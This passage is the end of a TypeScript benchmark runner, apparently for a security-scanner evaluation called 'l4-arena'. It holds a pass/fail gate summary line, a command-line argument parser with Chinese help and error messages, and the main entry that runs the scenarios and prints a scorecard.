		`Gates   : recall=${g.recallGate ? "PASS" : "FAIL"} | zeroFP=${g.zeroFalsePositiveGate ? "PASS" : "FAIL"} | zeroLeak=${g.zeroVaultLeakGate ? "PASS" : "FAIL"} | povGate=${g.standalonePovGate ? "PASS" : "FAIL"} | scopeGate=${g.scopeIsolationGate ? "PASS" : "FAIL"} => allPassed=${g.allPassed}`,
	);
	return lines.join("\n");
}

export function parseL4CliArgs(argv: readonly string[]): {
	json: boolean;
	deterministic: boolean;
	scenario?: string;
	help: boolean;
} {
	let json = false;
	let deterministic = false;
	let scenario: string | undefined;
	let help = false;

	for (let i = 0; i < argv.length; i++) {
		const arg = argv[i]!;
		if (arg === "--help" || arg === "-h") help = true;
		else if (arg === "--json") json = true;
		else if (arg === "--deterministic") deterministic = true;
		else if (arg === "--scenario") {
			const val = argv[++i];
			if (!val || val.startsWith("-")) throw new Error("--scenario 需要传入场景 ID");
			scenario = val.trim();
		} else if (arg.startsWith("--scenario=")) {
			const val = arg.slice("--scenario=".length).trim();
			if (!val) throw new Error("--scenario= 不能为空");
			scenario = val;
		} else {
			throw new Error(`未知命令行参数: ${arg}`);
		}
	}
	return { json, deterministic, scenario, help };
}

if (import.meta.main) {
	try {
		const opts = parseL4CliArgs(process.argv.slice(2));
		if (opts.help) {
			console.log(
				[
					"用法: bun benchmarks/l4-arena/run-l4-eval.ts [--json] [--deterministic] [--scenario <id>] [--help]",
					"",
					"选项:",
					"  --json              输出结构化 JSON 评分卡与硬门禁结论",
					"  --deterministic     使用固定时间戳与确定性耗时输出 JSON",
					"  --scenario <id>     仅运行单个指定场景（如 s01-second-order-store-read .. s12-fake200-trap-delayed-oob）",
					"  -h, --help          显示帮助信息",
				].join("\n"),
			);
			process.exit(0);
		}
		const summary = await runL4BenchmarkSuite({ scenario: opts.scenario, deterministic: opts.deterministic });
		if (opts.json) console.log(JSON.stringify(summary, null, 2));
		else console.log(formatL4ScorecardTable(summary));
		process.exit(summary.gates.allPassed ? 0 : 1);
	} catch (err) {
		console.error(`[l4-eval] 错误: ${err instanceof Error ? err.message : String(err)}`);
		process.exit(2);
	}
}
